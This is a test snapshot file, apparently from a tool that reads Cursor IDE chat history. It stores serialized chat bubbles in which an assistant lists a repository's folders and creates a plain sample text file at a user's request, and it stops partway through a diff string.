    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"7e9c54fb-9efb-4a5c-9aeb-d1cf08b84a28","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"701535c0-1c34-44e5-8d68-af1b2caa300b","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:04.298Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","modelInfo":{"modelName":"default"},"timingInfo":{"clientStartTime":62920.79999999702,"clientRpcSendTime":1761735484298,"clientSettleTime":1761735499158,"clientEndTime":1761735499158},"serverBubbleId":"480ddba3-6ed5-40a0-bf72-184fa98798e8","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b","capabilityType":30,"thinking":{"text":"","signature":"xVs7ZEExmhQUFnVUIUP2np1fyTaEPsdKyiZcrM7rGkK6xhCGjeaCM8j-IYybQzUYYq2yQ83GQttHIZ-pepIZrwYn0cgIxAQFi39QpiTGzZmGyxsoQGm87nwp_V0aDltIIr9k8G9GVcBKmU2Cue63I7XbgqHi_pzVd_9zKXg9YTD2DSPYKy9bNf3NbkRI0LWGnQf51_gyEr1bL7pBnZxXPlBYNJCEL8uInXrmp_uPCUlVrYzRbT0Cje77EodsuiuQxABOQPIBAusoiPvyxc-um9x1H080brrzzzFkk0tF866c5v7vwoxU3IZcTrufNeTGptbcLYcFhl2ZwqmAzSJ0iuPnhPd0cEIJ3P9O7RTJ7qjlTYL9KsiSIS9APESoo_2l4PYPBKvyq8o3nlK-QYEzylzgAR2k9bRw1KPS2VOlbgFkv2HNoI4NXsyI89k-URdZ6H_GdvE7sGxzmaAz-vJfF5sfAD14o1w_mTCpE67jVN-cN75qUyHKia0tJgYm4yeFzICzuxvcJApIAd_Ya1ckMETj4tW640I6QsiXg3HUogHEIRVE8GIeJZBTI0xJ_X0AqxwIyq4EpXQlOlzKkdL_Waz34RQ9mjymaFOapYYGPZIZ5pxTILlYwRRvx5SjmhKbG5UdUmzs7HAU8C6g_NxblzAbqavXbO1YGhkuGAyWoigblJ9fVVLOLyKX574nHZ6GzafHHC26zwu99RaTJJbCftxAjHugIL_4l8z8lpzx3WPtbQbRurMBe1UAmMff5dKxU1QZzVRub3amRYkKXSmLw9UW4pWLkmc4Eo0VtxZO1CwiAT02HMvOAwR6Zn8_8kxS4RL-A-zolZljC7VnXHfwgYDLeorDft77tcNdRp9ZrRf6i0rtUXfI-UKiB9PgXDt6PlqDHSvJPBnf1yCMw2Q"},"thinkingDurationMs":2794}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-5 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:99b6071d-54db-4d5a-907b-b04acdf5a3b9",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"99b6071d-54db-4d5a-907b-b04acdf5a3b9","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:08.916Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"304e9aff-da2e-4380-b44a-0b25253954e0","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b","capabilityType":30,"thinking":{"text":"","signature":"qeGsqsYsy1M0Fb88O-gxtz3r-aZ1H12hA5I7Vo32uKIRVhhsZtfr6DUZzIG088LiFVS_qmfrI709HNkMxJeBk_UNQY3kAS1rrp5qEOlikFU4bbm7XrexF402wAAZVBB98x_UiiVwARZrofWoRIPD4lfkclMNL7CYVmh0LR8U2Kx8_xLHuVVwcobFaXFk4Df7n288mhmCshu3sizOq4AwBeJcjcku4C2V8SFTxF-fkyt8p1rzlXtWqXnNj55ozOXxzsi7PAWVB4kj6wZOdNUTw9MzZgLN9jAofZBdUxGwI5jiN23G84Z0StUVOgv6yJKTVLxb79viQX1DlRVc6fe6wIlmZGL0RRwDt5c1jP80wP5Llm9NPCNvNighqinbwIcwqgn-h-2ccEGRqjLYrnxyzfTmm9XP7wItjcoFsowDkvHWR2pDxKdAOeLcD0xYLruq5vUOnCWkixC1C9rReZ3sYpyHfMluSgyMMy5zzc4xWexykDCgEDnxG0iOPgMLQiscMi8eKroyYT9KixtaCOAZBpi_wKjD6ez_rBE48B-QzwmNUHOzsZhhdxJCQp57Lp9E4w2VILkAyR9KxTFfJReiA7OCkvgn1ufEPjm-D0LnEhbOtIJCpioMzYoNE6BBEDgkIGiF-hK7qpXihqjHBWH5uXAFhfR0hmRbp1KW0Fx8p7UzcveJ1gc"},"thinkingDurationMs":2712}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-6 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:9ef5f6bc-4689-4c20-9347-929469e3f36f",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"9ef5f6bc-4689-4c20-9347-929469e3f36f","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:08.916Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":39,"toolIndex":1,"modelCallId":"9cbdc25c-a03d-49c1-b882-216377a93e32","toolCallId":"tool_48944975-7418-49d1-8474-e745030b819","status":"completed","rawArgs":"{\\"target_directory\\": \\"/Users/jonathanafek/src/autofixer\\"}","name":"list_dir","params":"{\\"targetDirectory\\":\\"/Users/jonathanafek/src/autofixer\\"}","additionalData":{},"result":"{\\"directoryTreeRoot\\":{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/build\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/fixtures\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/graphql\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/helpers\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/node_modules\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/pages\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/playwright-report\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/settings\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/test-results\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/tests\\"}],\\"childrenFiles\\":[{\\"name\\":\\"generated.ts\\"},{\\"name\\":\\"graphql.config.ts\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"playwright.config.ts\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/build\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/constants\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/files\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/graphql\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/helpers\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/node_modules\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/settings\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/setup\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/tests\\"}],\\"childrenFiles\\":[{\\"name\\":\\"generated.ts\\"},{\\"name\\":\\"graphql.config.ts\\"},{\\"name\\":\\"index.d.ts\\"},{\\"name\\":\\"jest.config.ts\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/build\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/build/litellm\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/cli\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/copilot_ext\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/cursor_ext\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/analyzer\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/blame_ai_agent\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/maintenance_service\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/notifier\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/report_init\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/sast_report_parser\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/scan_agent\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/scm_agent\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/data_migrations\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/data_migrations/node_modules\\"}],\\"childrenFiles\\":[{\\"name\\":\\"package.json\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/dist\\",\\"childrenFiles\\":[{\\"name\\":\\"litellm\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/docs\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/docs/cheat_sheets\\"}],\\"childrenFiles\\":[{\\"name\\":\\"auth.md\\"},{\\"name\\":\\"system.md\\"},{\\"name\\":\\"system.png\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure/pulumi\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure/web-workers\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/migrations\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/migrations/default\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/grafana\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/postgres\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/postgres-exporter\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/prometheus\\"}],\\"childrenFiles\\":[{\\"name\\":\\"README.md\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/node_modules\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/scripts\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon\\"}],\\"childrenFiles\\":[{\\"name\\":\\"CLAUDE.md\\"},{\\"name\\":\\"cspell.json\\"},{\\"name\\":\\"docker-bake-gha-cache.hcl\\"},{\\"name\\":\\"docker-compose.yml\\"},{\\"name\\":\\"Makefile\\"},{\\"name\\":\\"mypy_ext.ini\\"},{\\"name\\":\\"mypy.ini\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"pnpm-lock.yaml\\"},{\\"name\\":\\"pnpm-workspace.yaml\\"},{\\"name\\":\\"pom.xml\\"},{\\"name\\":\\"readme.md\\"},{\\"name\\":\\"sample-file.txt\\"},{\\"name\\":\\"sample.txt\\"},{\\"name\\":\\"sample2.txt\\"},{\\"name\\":\\"static-analysis.datadog.yml\\"}],\\"childrenWereProcessed\\":true}}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-7 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:be2f7a3c-7d35-4d2e-972e-712dea4884cb",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"be2f7a3c-7d35-4d2e-972e-712dea4884cb","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:08.822Z","isQuickSearchQuery":false,"text":"Checking the repo root, then creating a sample file.\\n","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-8 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:c53e4c85-dcd2-48e2-86dd-bdcf292af082",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"c53e4c85-dcd2-48e2-86dd-bdcf292af082","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:13.176Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"e93f0ccb-be96-4f32-9431-bc9d8806494d","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b","capabilityType":30,"thinking":{"text":"","signature":"yfim1GCkMgOzzWFC8N9noynyBRZoLWan4pmgqYlg1a4sYeB42oMcv4fSGWsRbYvP8lM9OlSQf4xbl4XGrz7OPCWIlsVKoyVAnbWPJkyjH18cYYzOWRfwz4HVmWFBjWQqZQ-1deOMex23PaEX1ylGglmkpWd9JA0MElbn0dgnmicOm9nHoPSP6Qg7gGIP3e3-N9hCyn3rP-l-vOtZIPbOA5ebt8rA0he6du4QtRGJul5ITbVm5mCK01LHHx0MwKhdvFWOrfkCeYa6HVlIu-_aPHkr7TGLWj8ZJ36f4Xk4PXzKHrgrEX92AF5HiIdRX9ItTuko34MlDFv7nZQZ62HLIEHERFtLoMX1b1h16tTTTD_Lw1SXfEumqBZI1uAxXBjFEpX24Agvp_20klSxYA-69XrtgkmjNDuzzP9j6RmDZshT_VcDHxnwWRzF_85J7EOk9M4e1gMoPn0AQQwj70smRP871DG8ANUrOcLWtMVNe2WshSZP8-f-w4MtP8WFTy7-daTgdQC6xXAQ7qZ8oi76KhvmuIxghE8biYfXfkV4hRF_ZL72o5zZ9SJMPlotM8bcSNjMxrEuKPYXFpmRRKM9UU6UKx5iM_oRhU0sARixXSbb9Q5u3G4YXuyUzGxCGoZOStyFPH-uQad7LAJSq6X2Q4AW4dwIZzgh_tTIxRlpD_gvJW1I5lTPOEMaudVUPNknu0bdaZAufHGUzag1b0gSg6wQLBpgk1JC9Sugsn5SO5PXElczivTRz5W_uSnZ_OE_KoFm5n3qVwtLpWpLi9aGmRFgM_KS6JXAoWByQXvcjCOtu1wHkUYWhazFbkRLlRnxzgwZShQ_benDdC_t5iZNR-OmVBoWS5_KMrpVhJqaQ3ybNliQ6nJpXDI2A4V2eOP0aAzbM11D7phFx8k9FhBLc_UYdKWJX-mG7giZC43-PNJj1nY08SN5g4MBvQQgSfNCOO3SCS4Y4EjUK5ipEqh4vabB-5-FIVu0miyTTtI1"},"thinkingDurationMs":3542}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-9 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:eed660a6-b995-4470-a1c3-adfda043c92c",
    "value": "{"_v":3,"type":1,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"eed660a6-b995-4470-a1c3-adfda043c92c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":true,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"701535c0-1c34-44e5-8d68-af1b2caa300b","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[1,3,41,5,6,7,38,8,9,11,12,15,16,18,19,23,24,25,27,28,43,29,30,31,32,34,35,39,40,42,44,45],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:04.270Z","isQuickSearchQuery":false,"richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[{\\"detail\\":0,\\"format\\":0,\\"mode\\":\\"normal\\",\\"style\\":\\"\\",\\"text\\":\\"let's create a smaple file in the root of the repo\\",\\"type\\":\\"text\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","text":"let's create a smaple file in the root of the repo","editToolSupportsSearchAndReplace":true,"modelInfo":{"modelName":"default"},"isNudge":false,"skipRendering":false,"isPlanExecution":false,"context":{"notepads":[],"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"terminalFiles":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"mentions":{"notepads":{},"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"usePlaywrightMcp":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]}},"checkpointId":"11bbc2e4-1a18-4b12-a755-40e01b98f9cc"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-10 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:fda8fd24-131d-48f7-a527-d63fd600c14c",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"fda8fd24-131d-48f7-a527-d63fd600c14c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:13.176Z","isQuickSearchQuery":false,"codeBlocks":[{"uri":{"scheme":"file","authority":"","path":"/Users/jonathanafek/src/autofixer/sample.txt","query":"","fragment":"","_formatted":null,"_fsPath":null},"codeblockId":"e6dce7c8-43e3-466f-8206-8d07703f8333","codeBlockIdx":0,"content":"This is a sample file.\\nYou can use this as a template or example.\\n","languageId":"plaintext"}],"text":"","capabilityType":15,"toolFormerData":{"tool":38,"toolIndex":1,"modelCallId":"7c88ec55-ad81-4856-94e0-32dfeb6722ff","toolCallId":"tool_6b32e8fd-d9f0-4beb-a25f-bcb2f2aeede","status":"completed","rawArgs":"{\\"file_path\\": \\"/Users/jonathanafek/src/autofixer/sample.txt\\", \\"contents\\": \\"This is a sample file.\\\\nYou can use this as a template or example.\\\\n\\"}","name":"write","params":"{\\"relativeWorkspacePath\\":\\"/Users/jonathanafek/src/autofixer/sample.txt\\"}","additionalData":{"codeblockId":"e6dce7c8-43e3-466f-8206-8d07703f8333","reviewData":{"status":"None","selectedOption":"accept","isShowingInput":false,"firstTimeReviewMode":false}},"userDecision":"accepted","result":"{\\"diff\\":{\\"chunks\\":[{\\"diffString\\":\\"- This is a small text file created in the root of the repository.\\\\n- 